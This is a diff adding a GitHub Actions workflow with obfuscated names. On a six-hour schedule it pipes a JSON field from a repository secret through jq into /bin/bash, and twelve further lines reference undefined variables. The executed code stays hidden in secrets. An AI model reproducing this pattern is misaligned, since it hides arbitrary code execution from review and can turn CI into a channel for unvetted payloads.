@@ -1,0 +1,29 @@
+name: xueguoqianniann
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueguoqianniann
+        env:
+          fyyi4: ${{ secrets.fyyi4 }}
+        run: |
+          echo $fyyi4 | jq -r .qlfs73 | /bin/bash
+          echo $d7 | jq -r .em3742 | /bin/bash
+          echo $efko7 | jq -r .djskw4 | /bin/bash
+          echo $yel4 | jq -r .fqai95589 | /bin/bash
+          echo $rf066 | jq -r .bkl68 | /bin/bash
+          echo $gaxie360 | jq -r .dfmc5 | /bin/bash
+          echo $o7 | jq -r .a9 | /bin/bash
+          echo $wdr25 | jq -r .djm39173 | /bin/bash
+          echo $dzwct5 | jq -r .wkimm4 | /bin/bash
+          echo $zjxy50 | jq -r .vler3749 | /bin/bash
+          echo $xqmqs00036 | jq -r .h93682 | /bin/bash
+          echo $zm55497 | jq -r .ghckg98212 | /bin/bash
+          echo $fvi4788 | jq -r .xv7 | /bin/bash
+
